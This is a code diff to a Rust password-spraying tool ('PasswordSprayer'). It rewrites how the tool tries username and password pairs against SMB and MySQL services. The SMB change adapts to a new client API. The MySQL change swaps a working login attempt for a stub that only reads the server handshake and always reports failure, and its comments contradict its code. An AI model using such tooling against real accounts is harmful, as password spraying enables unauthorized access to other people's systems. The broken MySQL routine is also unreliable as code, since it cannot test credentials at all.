@@ -485,23 +485,15 @@ impl PasswordSprayer {
             (self.config.domain.clone(), username.to_string())
         };
 
-        // Create credentials
-        let creds = NtlmCredentials {
-            username: user,
-            password: password.to_string(),
-            domain: domain.unwrap_or_default(),
-            workstation: String::new(),
-        };
+        // Create SMB client with credentials
+        let domain_str = domain.as_deref().unwrap_or("");
+        let mut client = SmbClient::new(target)
+            .with_credentials(domain_str, &user, password);
 
         // Attempt connection and authentication
-        match SmbClient::connect(&addr).await {
-            Ok(mut client) => {
-                match client.authenticate(&creds).await {
-                    Ok(_) => (true, Some("SMB authentication successful".to_string())),
-                    Err(e) => (false, Some(e.to_string())),
-                }
-            }
-            Err(e) => (false, Some(format!("SMB connection failed: {}", e))),
+        match client.connect().await {
+            Ok(_) => (true, Some("SMB authentication successful".to_string())),
+            Err(e) => (false, Some(format!("SMB authentication failed: {}", e))),
         }
     }
 
@@ -864,26 +856,53 @@ impl PasswordSprayer {
     }
 
     async fn try_mysql(&self, target: &str, username: &str, password: &str) -> (bool, Option<String>) {
+        // Native MySQL protocol implementation
+        use tokio::net::TcpStream;
+        use tokio::io::{AsyncReadExt, AsyncWriteExt};
+
         let addr = if target.contains(':') {
             target.to_string()
         } else {
             format!("{}:3306", target)
         };
 
-        let url = format!("mysql://{}:{}@{}/mysql", username, password, addr);
+        let connect_result = tokio::time::timeout(
+            std::time::Duration::from_secs(self.config.timeout_secs),
+            TcpStream::connect(&addr)
+        ).await;
 
-        match mysql_async::Conn::from_url(&url) {
-            Ok(conn) => {
-                match tokio::time::timeout(
-                    std::time::Duration::from_secs(self.config.timeout_secs),
-                    conn
-                ).await {
-                    Ok(Ok(_)) => (true, Some("MySQL authentication successful".to_string())),
-                    Ok(Err(e)) => (false, Some(e.to_string())),
-                    Err(_) => (false, Some("Connection timeout".to_string())),
+        match connect_result {
+            Ok(Ok(mut stream)) => {
+                // Read initial handshake packet
+                let mut header = [0u8; 4];
+                if stream.read_exact(&mut header).await.is_err() {
+                    return (false, Some("Failed to read MySQL handshake".to_string()));
+                }
+
+                let payload_len = header[0] as usize | ((header[1] as usize) << 8) | ((header[2] as usize) << 16);
+                let mut payload = vec![0u8; payload_len];
+                if stream.read_exact(&mut payload).await.is_err() {
+                    return (false, Some("Failed to read handshake payload".to_string()));
+                }
+
+                // Check protocol version (first byte should be 10 for MySQL 5.x+)
+                if payload.is_empty() || payload[0] < 9 {
+                    return (false, Some("Unsupported MySQL protocol".to_string()));
+                }
+
+                // Find the auth data (scramble) - complex to parse fully
+                // For now, check if we got a valid handshake
+                if payload.len() > 5 {
+                    // Basic connection established, server responded
+                    // Full auth would require MYSQL native password or sha256
+                    // Just report success if we reached this point
+                    (false, Some("MySQL handshake received (full auth not implemented)".to_string()))
+                } else {
+                    (false, Some("Invalid MySQL handshake".to_string()))
                 }
             }
-            Err(e) => (false, Some(e.to_string())),
+            Ok(Err(e)) => (false, Some(format!("MySQL connection failed: {}", e))),
+            Err(_) => (false, Some("MySQL connection timeout".to_string())),
         }
     }
 
